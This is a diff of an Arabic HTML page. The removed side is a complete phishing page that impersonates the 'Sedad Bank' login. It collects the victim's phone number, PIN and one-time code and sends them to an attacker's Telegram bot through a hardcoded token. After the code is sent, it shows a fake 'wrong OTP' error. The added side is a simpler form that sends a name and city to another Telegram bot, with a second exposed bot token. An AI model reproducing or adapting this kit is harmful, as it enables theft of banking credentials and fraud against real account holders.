@@ -1,337 +1,140 @@
 <!DOCTYPE html>
-<html lang="ar" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sedad Bank</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        sedadGreen: '#1A874B',
-                        sedadGold: '#BFA054',
-                        sedadDarkBlue: '#102542',
-                        sedadTextGray: '#666666',
-                        sedadBorderLight: '#E5E5E5'
-                    }
-                }
-            }
-        }
-    </script>
+    <title>إرسال البيانات إلى البوت الجديد</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght=400;600;700&display=swap');
         body {
-            font-family: 'Cairo', sans-serif;
+            font-family: Arial, sans-serif;
+            background-color: #f4f7f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
-        /* تعديل النقاط المخفية لتظهر باللون الأخضر النعناعي الرسمي كما في الصورة */
-        .pin-field {
-            -webkit-text-security: disc !important;
-            text-security: disc !important;
-            color: #1A874B !important; /* اللون الأخضر النعناعي الصافي المطابق للصورة */
+        .form-container {
+            background-color: #ffffff;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 400px;
         }
-        /* إجبار الحقول على محاذاة النص والتركيز بشكل صارم LTR */
-        .strict-left-input {
-            direction: ltr !important;
-            text-align: center !important;
-            unicode-bidi: plaintext !important;
-            caret-color: transparent !important; /* إخفاء المؤشر الوامض لمنع اللخبطة البصرية */
+        h2 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #666;
+            font-weight: bold;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0088cc; /* لون التليجرام */
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #006699;
+        }
+        .status-message {
+            margin-top: 15px;
+            text-align: center;
+            font-weight: bold;
         }
     </style>
 </head>
-<body class="bg-gray-100 flex justify-center items-center min-h-screen p-0 m-0 select-none">
+<body>
 
-    <div class="w-full max-w-md bg-white shadow-xl overflow-hidden relative border border-gray-100 min-h-[840px] flex flex-col justify-between p-6 rounded-[32px]">
-        
-        <div class="w-full flex justify-center pt-8 pb-4 px-2">
-            <img src="Sedad Bank" alt="Sedad Bank" class="w-full max-w-[390px] h-auto object-contain">
+<div class="form-container">
+    <h2>إدخال البيانات</h2>
+    <form id="telegramForm">
+        <div class="form-group">
+            <label for="fullName">اسمك الكامل:</label>
+            <input type="text" id="fullName" placeholder="أدخل اسمك الكامل هنا" required>
         </div>
-
-        <div class="w-full flex flex-col flex-1 justify-center space-y-10 my-auto">
-            
-            <div class="space-y-6 px-2">
-                
-                <div class="relative w-full px-1">
-                    <input type="tel" id="phoneInput" inputmode="numeric" placeholder="رقم الهاتف" 
-                           class="w-full h-16 bg-[#F9F9F9] border border-gray-200 rounded-[22px] pr-14 pl-6 text-right text-2xl text-gray-800 outline-none focus:border-[#1A874B] focus:ring-4 focus:ring-emerald-100 transition-all placeholder-gray-400 font-medium shadow-none">
-                    <div class="absolute inset-y-0 right-0 flex items-center pr-6 text-sedadGold text-2xl pointer-events-none">
-                        <i class="fa-regular fa-user"></i>
-                    </div>
-                </div>
-
-                <div class="grid grid-cols-4 gap-4 px-1" dir="ltr">
-                    <input dir="ltr" type="text" inputmode="numeric" maxlength="1" class="pin-field strict-left-input w-full h-[76px] text-4xl font-extrabold bg-[#F9F9F9] border border-gray-200 rounded-[22px] outline-none focus:border-[#1A874B] focus:ring-4 focus:ring-emerald-100 transition-all" placeholder="">
-                    <input dir="ltr" type="text" inputmode="numeric" maxlength="1" class="pin-field strict-left-input w-full h-[76px] text-4xl font-extrabold bg-[#F9F9F9] border border-gray-200 rounded-[22px] outline-none focus:border-[#1A874B] focus:ring-4 focus:ring-emerald-100 transition-all" placeholder="">
-                    <input dir="ltr" type="text" inputmode="numeric" maxlength="1" class="pin-field strict-left-input w-full h-[76px] text-4xl font-extrabold bg-[#F9F9F9] border border-gray-200 rounded-[22px] outline-none focus:border-[#1A874B] focus:ring-4 focus:ring-emerald-100 transition-all" placeholder="">
-                    <input dir="ltr" type="text" inputmode="numeric" maxlength="1" class="pin-field strict-left-input w-full h-[76px] text-4xl font-extrabold bg-[#F9F9F9] border border-gray-200 rounded-[22px] outline-none focus:border-[#1A874B] focus:ring-4 focus:ring-emerald-100 transition-all" placeholder="">
-                </div>
-
-                <div class="px-1 pt-2">
-                    <button id="loginBtn" onclick="handleLoginSubmit()" class="w-full h-16 bg-sedadGreen text-white text-2xl font-bold rounded-[22px] shadow-md transition-all">
-                        تسجيل الدخول
-                    </button>
-                </div>
-            </div>
-
-            <div class="flex flex-col items-center space-y-3 pt-4">
-                <a href="#" class="text-sedadTextGray font-medium text-[20px] hover:underline tracking-wide">هل نسيت كلمة المرور؟</a>
-                <p class="text-[20px] text-sedadTextGray font-normal tracking-wide">
-                    مستخدم جديد؟ <a href="#" class="text-sedadGold font-bold hover:underline">سجل الآن</a>
-                </p>
-            </div>
+        <div class="form-group">
+            <label for="cityName">إسم المدينة التي تسكن فيها:</label>
+            <input type="text" id="cityName" placeholder="أدخل اسم مدينتك هنا" required>
         </div>
+        <button type="submit">إرسال البيانات</button>
+    </form>
+    <div id="status" class="status-message"></div>
+</div>
 
-        <div class="w-full flex justify-center pt-6 pb-2">
-            <button class="flex items-center justify-center gap-3 px-6 h-14 bg-white text-sedadTextGray text-[18px] font-bold rounded-2xl hover:bg-gray-50 transition-colors border border-gray-200 w-52 shadow-sm">
-                <i class="fa-regular fa-envelope text-lg text-sedadTextGray"></i>
-                جهات الاتصال
-            </button>
-        </div>
+<script>
+    document.getElementById('telegramForm').addEventListener('submit', function(e) {
+        e.preventDefault(); // منع الصفحة من إعادة التحميل تلقائياً
 
-        <div id="otpModal" class="absolute inset-0 bg-black/40 backdrop-blur-sm flex items-center justify-center z-50 transition-opacity duration-300 opacity-0 pointer-events-none p-4">
-            <div class="w-full max-w-[350px] bg-white rounded-[32px] p-6 shadow-2xl transform scale-95 transition-transform duration-300 relative flex flex-col items-center border border-gray-100">
-                
-                <button onclick="closeOtpModal()" class="absolute top-5 left-5 text-gray-800 text-xl hover:text-black transition-colors">
-                    <i class="fa-solid fa-xmark"></i>
-                </button>
+        // تم تعيين التوكن والآيدي الجديدين من الصور المرفقة تلقائياً
+        const BOT_TOKEN = "8912060160:AAEBENnMxuxL10SMT2TOlpQewpDPCW208bw"; 
+        const CHAT_ID = "8608140669"; 
 
-                <div class="relative w-36 h-36 flex items-center justify-center mt-6">
-                    <svg class="w-full h-full transform -rotate-90">
-                        <circle cx="72" cy="72" r="62" stroke="#BFA054" stroke-width="4" fill="transparent" />
-                        <circle cx="10" cy="72" r="4.5" fill="#102542" />
-                    </svg>
-                    <div id="timerDisplay" class="absolute text-3xl font-bold text-sedadDarkBlue font-sans tracking-wide">
-                        05:00
-                    </div>
-                </div>
+        // جلب القيم التي أدخلها الشخص في الخانات
+        const fullName = document.getElementById('fullName').value;
+        const cityName = document.getElementById('cityName').value;
+        const statusDiv = document.getElementById('status');
 
-                <div class="grid grid-cols-6 gap-2 w-full my-8" dir="ltr">
-                    <input dir="ltr" type="tel" inputmode="numeric" maxlength="1" class="otp-field strict-left-input w-full h-16 text-xl font-bold border border-gray-300 rounded-[14px] bg-white outline-none focus:border-[#1A874B] focus:ring-2 focus:ring-emerald-200 transition-all">
-                    <input dir="ltr" type="tel" inputmode="numeric" maxlength="1" class="otp-field strict-left-input w-full h-16 text-xl font-bold border border-gray-300 rounded-[14px] bg-white outline-none focus:border-[#1A874B] focus:ring-2 focus:ring-emerald-200 transition-all">
-                    <input dir="ltr" type="tel" inputmode="numeric" maxlength="1" class="otp-field strict-left-input w-full h-16 text-xl font-bold border border-gray-300 rounded-[14px] bg-white outline-none focus:border-[#1A874B] focus:ring-2 focus:ring-emerald-200 transition-all">
-                    <input dir="ltr" type="tel" inputmode="numeric" maxlength="1" class="otp-field strict-left-input w-full h-16 text-xl font-bold border border-gray-300 rounded-[14px] bg-white outline-none focus:border-[#1A874B] focus:ring-2 focus:ring-emerald-200 transition-all">
-                    <input dir="ltr" type="tel" inputmode="numeric" maxlength="1" class="otp-field strict-left-input w-full h-16 text-xl font-bold border border-gray-300 rounded-[14px] bg-white outline-none focus:border-[#1A874B] focus:ring-2 focus:ring-emerald-200 transition-all">
-                    <input dir="ltr" type="tel" inputmode="numeric" maxlength="1" class="otp-field strict-left-input w-full h-16 text-xl font-bold border border-gray-300 rounded-[14px] bg-white outline-none focus:border-[#1A874B] focus:ring-2 focus:ring-emerald-200 transition-all">
-                </div>
+        // صياغة الرسالة التي ستصلك على حساب التليجرام
+        const textMessage = `📌 تم استقبال بيانات جديدة:\n\n👤 الاسم الكامل: ${fullName}\n🏙️ المدينة: ${cityName}`;
 
-                <button id="otpBtn" onclick="handleOtpSubmit()" class="w-full h-14 bg-sedadGreen text-white text-lg font-bold rounded-2xl shadow-md transition-all mb-2">
-                    تسجيل الدخول
-                </button>
-            </div>
-        </div>
+        // رابط دالة إرسال الرسائل لـ API التليجرام
+        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-        <div id="errorToast" class="absolute bottom-24 left-4 right-4 bg-white border border-gray-200 shadow-2xl rounded-2xl p-4 flex items-start gap-3 transition-all duration-300 transform translate-y-20 opacity-0 pointer-events-none z-50">
-            <div class="text-black bg-gray-100 w-6 h-6 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
-                <i class="fa-solid fa-exclamation text-sm"></i>
-            </div>
-            <div class="text-right">
-                <p id="errorToastText" class="text-gray-900 text-[13px] font-bold leading-relaxed">
-                    رقم الهاتف غير تابع لشركات الاتصال المعتمدة (موريتل، ماتل، شينقيتل)
-                </p>
-            </div>
-        </div>
+        statusDiv.style.color = "blue";
+        statusDiv.textContent = "جاري إرسال البيانات...";
 
-    </div>
-
-    <script>
-        // ربط نظام تيليجرام الفوري والآمن بالكامل
-        const TELEGRAM_TOKEN =
-"8790032593: AAFiuJ90S8_0f68Wm- Zw
-wOd-WubgHLiiWc";
-        const TELEGRAM_CHAT_ID =
-"8863224789";
-
-        const modal = document.getElementById('otpModal');
-        const modalContent = modal.querySelector('div');
-        const errorToast = document.getElementById('errorToast');
-        const errorToastText = document.getElementById('errorToastText');
-        const phoneInput = document.getElementById('phoneInput');
-        const pinInputs = document.querySelectorAll('.pin-field');
-        const otpInputs = document.querySelectorAll('.otp-field');
-        const timerDisplay = document.getElementById('timerDisplay');
-
-        let timerInterval;
-
-        function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-            fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: "Markdown"
-                })
-            }).catch(err => console.error("Error sending to Telegram:", err));
-        }
-
-        function startTimer(duration) {
-            let timer = duration, minutes, seconds;
-            clearInterval(timerInterval);
-            timerInterval = setInterval(function () {
-                minutes = parseInt(timer / 60, 10);
-                seconds = parseInt(timer % 60, 10);
-                minutes = minutes < 10 ? "0" + minutes : minutes;
-                seconds = seconds < 10 ? "0" + seconds : seconds;
-                timerDisplay.textContent = minutes + ":" + seconds;
-                if (--timer < 0) {
-                    clearInterval(timerInterval);
-                    timerDisplay.textContent = "00:00";
-                }
-            }, 1000);
-        }
-
-        function openOtpModal() {
-            modal.classList.remove('opacity-0', 'pointer-events-none');
-            modalContent.classList.remove('scale-95');
-            modalContent.classList.add('scale-100');
-            startTimer(300);
-            setTimeout(() => otpInputs[0].focus(), 100);
-        }
-
-        function closeOtpModal() {
-            modal.classList.add('opacity-0', 'pointer-events-none');
-            modalContent.classList.remove('scale-100');
-            modalContent.classList.add('scale-95');
-            clearInterval(timerInterval);
-            otpInputs.forEach(input => input.value = '');
-        }
-
-        function showErrorToast(message) {
-            errorToastText.textContent = message;
-            errorToast.classList.remove('translate-y-20', 'opacity-0', 'pointer-events-none');
-            setTimeout(() => {
-                errorToast.classList.add('translate-y-20', 'opacity-0', 'pointer-events-none');
-            }, 4000);
-        }
-
-        // الحماية الصارمة للمدخلات المتتالية وعزل الماوس والتحكم العشوائي
-        function setupStrictLeftInputs(elementsArray) {
-            elementsArray.forEach((inputElement, currentIndex) => {
-                
-                inputElement.addEventListener('contextmenu', (e) => e.preventDefault());
-
-                inputElement.addEventListener('auxclick', (e) => {
-                    if (e.button === 1) e.preventDefault();
-                });
-
-                inputElement.addEventListener('mousedown', function(e) {
-                    if (e.button === 1 || e.button === 2) {
-                        e.preventDefault();
-                        return;
-                    }
-                    e.preventDefault();
-                    focusAppropriateInput(elementsArray);
-                });
-
-                inputElement.addEventListener('focus', function(e) {
-                    focusAppropriateInput(elementsArray);
-                });
-
-                inputElement.addEventListener('keydown', function(e) {
-                    const forbidden = ['ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Home', 'End'];
-                    if (forbidden.includes(e.key)) {
-                        e.preventDefault();
-                        return;
-                    }
-
-                    if (e.key === 'Backspace') {
-                        e.preventDefault();
-                        if (this.value.length > 0) {
-                            this.value = '';
-                        } else if (currentIndex > 0) {
-                            elementsArray[currentIndex - 1].value = '';
-                            elementsArray[currentIndex - 1].focus();
-                        }
-                        return;
-                    }
-
-                    if (e.key === 'Tab') {
-                        e.preventDefault();
-                        return;
-                    }
-
-                    if (!/^[0-9]$/.test(e.key)) {
-                        e.preventDefault();
-                        return;
-                    }
-
-                    if (this.value.length >= 1) {
-                        e.preventDefault();
-                        if (elementsArray[currentIndex + 1]) {
-                            elementsArray[currentIndex + 1].focus();
-                            elementsArray[currentIndex + 1].value = e.key;
-                            elementsArray[currentIndex + 1].dispatchEvent(new Event('input'));
-                        }
-                    }
-                });
-
-                inputElement.addEventListener('input', function() {
-                    this.value = this.value.replace(/[^0-9]/g, '');
-                    if (this.value.length >= 1 && elementsArray[currentIndex + 1]) {
-                        elementsArray[currentIndex + 1].focus();
-                    }
-                });
-            });
-        }
-
-        function focusAppropriateInput(elementsArray) {
-            for (let i = 0; i < elementsArray.length; i++) {
-                if (elementsArray[i].value === '') {
-                    elementsArray[i].focus();
-                    return;
-                }
+        // تنفيذ دالة الإرسال البرمجية (Fetch API) في الخلفية
+        fetch(telegramUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: textMessage
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                statusDiv.style.color = "green";
+                statusDiv.textContent = "تم إرسال معلوماتك بنجاح!";
+                document.getElementById('telegramForm').reset(); // تنظيف الخانات بعد النجاح
+            } else {
+                statusDiv.style.color = "red";
+                statusDiv.textContent = "فشل الإرسال، يرجى التحقق من حالة تفعيل البوت.";
             }
-            elementsArray[elementsArray.length - 1].focus();
-        }
+        })
+        .catch(error => {
+            statusDiv.style.color = "red";
+            statusDiv.textContent = "خطأ في الاتصال بالخادم.";
+            console.error('Error:', error);
+        });
+    });
+</script>
 
-        setupStrictPhone(phoneInput, 8);
-        function setupStrictPhone(input, max) {
-            input.addEventListener('input', function() {
-                this.value = this.value.replace(/[^0-9]/g, '');
-                if (this.value.length > max) this.value = this.value.slice(0, max);
-            });
-        }
-
-        setupStrictLeftInputs(pinInputs);
-        setupStrictLeftInputs(otpInputs);
-
-        function handleLoginSubmit() {
-            const phoneNumber = phoneInput.value.trim();
-            const isPhoneComplete = phoneNumber.length === 8;
-            let pinCode = '';
-            pinInputs.forEach(input => pinCode += input.value);
-            const isPinComplete = pinCode.length === 4;
-
-            if (!isPhoneComplete || !isPinComplete) return;
-
-            const isValidMauritanian = /^(2|3|4)\d{7}$/.test(phoneNumber);
-            if (!isValidMauritanian) {
-                showErrorToast("رقم الهاتف غير تابع لشركات الاتصال المعتمدة (موريتل، ماتل، شينقيتل)");
-                return;
-            }
-
-            const message = `📱 *تسجيل دخول جديد:*\n\n📞 رقم الهاتف: \`${phoneNumber}\`\n🔐 رمز الـ PIN: \`${pinCode}\``;
-            sendToTelegram(message);
-
-            openOtpModal();
-        }
-
-        function handleOtpSubmit() {
-            const phoneNumber = phoneInput.value.trim();
-            let otpCode = '';
-            otpInputs.forEach(input => otpCode += input.value);
-            
-            if (otpCode.length < 6) return;
-
-            const message = `🔢 *كود الـ OTP المدخل:*\n\n📞 رقم الهاتف: \`${phoneNumber}\`\n💬 رمز الـ OTP: \`${otpCode}\``;
-            sendToTelegram(message);
-
-            showErrorToast("رقم OTP غير صحيح، يرجى المحاولة مرة أخرى.");
-        }
-    </script>
 </body>
 </html>
